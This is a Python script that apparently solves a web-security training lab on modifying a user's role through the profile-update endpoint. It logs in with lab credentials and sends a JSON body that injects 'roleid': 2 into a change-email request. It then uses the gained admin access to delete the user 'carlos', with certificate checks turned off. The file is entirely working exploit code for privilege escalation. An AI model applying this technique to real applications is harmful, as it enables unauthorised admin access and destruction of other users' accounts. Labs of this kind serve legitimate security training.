import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "User role can be modified in user profile"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Login as wiener\n2. Change the roleid of wiener\n3. Delete carlos from the admin panel\n""")

    print(Fore.WHITE + "[1] Logging in as wiener")
    data = {"username": "wiener", "password": "peter"}
    login_as_wiener = requests.post(
        f"{url}/login", data=data, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[2] Changing the roleid to 2")
    
    session = login_as_wiener.cookies.get("session")
    cookies = {"session": session}
    data = """{ "email": "mystic_mido@admin.net", "roleid": 2 }"""
    headers = {"Content-Type": "text/plain"}
    requests.post(
        f"{url}/my-account/change-email", data=data, cookies=cookies, headers=headers, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[3] Deleting carlos from the admin panel")

    try:
        r = requests.get(
            f"{url}/admin/delete?username=carlos", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
